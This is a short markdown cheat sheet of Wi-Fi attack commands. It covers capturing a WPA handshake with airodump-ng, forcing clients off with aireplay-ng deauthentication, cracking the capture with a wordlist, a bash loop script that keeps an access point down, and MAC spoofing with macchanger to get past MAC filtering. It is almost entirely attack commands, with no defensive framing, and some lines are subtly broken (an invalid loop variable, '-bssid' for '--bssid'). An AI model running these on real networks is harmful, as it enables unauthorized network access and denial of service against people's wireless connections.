# Wifi

## aircrack-ng
```console
airmon-ng start [WIRELESS INTERFACE]
```

Note: The interface name might have changed to [WIRELESS INTERFACE]mon. Example: wlan0mon
```console
airodump-ng [WIRELESS INTERFACE]
```

```console
airodump-ng -bssid [AP MAC ADDRESS] -c [AP CHANNEL] --write [FILENAME].cap [WIRELESS INTERFACE]mon
```

```console
aireplay-ng --deauth 100 -a [CLIENT MAC ADDRESS] [WIRELESS INTERFACE]mon
```

```console
aircrack-ng -w [PATH TO WORDLIST].txt [PATH TO HASH FILE].cap
```

## Accesspoint DoS Script
```console
#! /bin/bash

  for 1 in {1..5000}
  
  do
    aireplay-ng --deauth 1000 -a [AP MAC ADDRESS] [WIRELESS INTERFACE]
    sleep 60s
    
done
```

## MAC Filtering Evasion
Scan for wireless acess points:
```console
airodump-ng start [WIRELESS ADAPTER]
```

Note: The interface name might have changed to [WIRELESS INTERFACE]mon. Example: wlan0mon

```console
airodump-ng [WIRELESS ADAPTER]mon
```

Scan for connected devices:

```console
airodump-ng -c 11 -a -bssid [MAC ADDRESS OF ACCESS POINT]
```

MAC address spoofing:

```console
ifconfig [WIRELESS ADAPTER] down
```

```console
macchanger -m [MAC ADDRESS OF CONNECTED DEVICE] [WIRELESS ADAPTER]
```

```console
ifconfig [WIRELESS ADAPTER] up
```
